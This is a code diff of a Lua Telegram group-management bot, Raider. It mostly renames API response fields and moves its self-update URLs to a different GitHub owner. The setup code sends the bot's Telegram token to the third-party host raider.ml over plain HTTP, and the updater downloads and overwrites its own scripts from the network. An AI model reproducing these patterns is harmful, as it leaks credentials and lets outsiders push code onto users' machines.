@@ -31,24 +31,24 @@ if not redis:get(Server_DevRaider.."User_DevRaider1") then
 io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
-local RaiderInfo = http.request("http://raider.ml/GetUser?user="..User_Sudo)
-local RaideGetInfo = JSON.decode(RaiderInfo)
-if RaideGetInfo.information.status == 'invalid' then
+local GetInfoUser = http.request("http://raider.ml/GetUser?user="..User_Sudo)
+local User_Info = JSON.decode(GetInfoUser)
+if User_Info.Info.Chek == "Not_Info" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
 os.execute('lua Raider.lua')
 end
-if RaideGetInfo.information.status == 'Spammer' then
+if User_Info.Info.Chek == "Is_Spam" then
 io.write('\n\27[1;31m🔄┇Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
 os.execute('lua Raider.lua')
 end
-if RaideGetInfo.information.status == 'Channel' then
+if User_Info.Info == 'Channel' then
 io.write('\n\27[1;31m🔄┇The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
 os.execute('lua Raider.lua')
 end
 io.write('\n\27[1;31m☑┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
-redis:set(Server_DevRaider.."User_DevRaider1",RaideGetInfo.information.status.Username)
-redis:set(Server_DevRaider.."Id_DevRaider",RaideGetInfo.information.status.Id)
-http.request("http://raider.ml/insert/?id="..RaideGetInfo.information.status.Id.."&user="..RaideGetInfo.information.status.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
+redis:set(Server_DevRaider.."User_DevRaider1",User_Info.Info.Username)
+redis:set(Server_DevRaider.."Id_DevRaider",User_Info.Info.Id)
+http.request("http://raider.ml/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
 else
 io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
@@ -465,7 +465,7 @@ height_ = 0
 end
 ------------------------------------------------------------------------------------------------------------
 function tdcli_update_callback_value(Data) 
-url = 'https://raw.githubusercontent.com/RSAIED/RAIDER/master/Script.lua'
+url = 'https://raw.githubusercontent.com/NOVAR1/RAIDER/master/Script.lua'
 file_path = 'Script.lua'
 local respbody = {} 
 local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
@@ -485,7 +485,7 @@ end
 ------------------------------------------------------------------------------------------------------------ 
 function tdcli_update_callback_value_(Data) 
 tdcli_update_callback_value(Data) 
-url = 'https://raw.githubusercontent.com/RSAIED/RAIDER/master/Raider.lua'
+url = 'https://raw.githubusercontent.com/NOVAR1/RAIDER/master/Raider.lua'
 file_path = 'Raider.lua'
 local respbody = {} 
 local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
@@ -1495,7 +1495,7 @@ return false
 end 
 if text == "مدير" then
 if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,"\n??┇الاستخدام خطا رتبتك اقل من منشئ \n〽┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز  ، ادمن }") 
+send(msg.chat_id_, msg.id_,"\n💢┇الاستخدام خطا رتبتك اقل من منشئ \n〽┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز  ، ادمن }") 
 return false
 end
 end
@@ -2087,7 +2087,7 @@ end
 if text == 'تفعيل' and DeveloperBot(msg) then
 local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
 data = JSON.decode(url)
-if data.Ch_Raider.Info_Raider ~= true then
+if data.Ch_Member.Info_Raider ~= true then
 send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
 return false 
 end 
@@ -2146,7 +2146,7 @@ end
 if text == 'تعطيل' and DeveloperBot(msg) then
 local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
 data = JSON.decode(url)
-if data.Ch_Raider.Info_Raider ~= true then
+if data.Ch_Member.Info_Raider ~= true then
 send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
 return false 
 end 
@@ -2190,7 +2190,7 @@ end
 if text == 'تفعيل' and not DeveloperBot(msg) and not redis:get(bot_id..'Free:Bot') then
 local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
 data = JSON.decode(url)
-if data.Ch_Raider.Info_Raider ~= true then
+if data.Ch_Member.Info_Raider ~= true then
 send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
 return false 
 end 
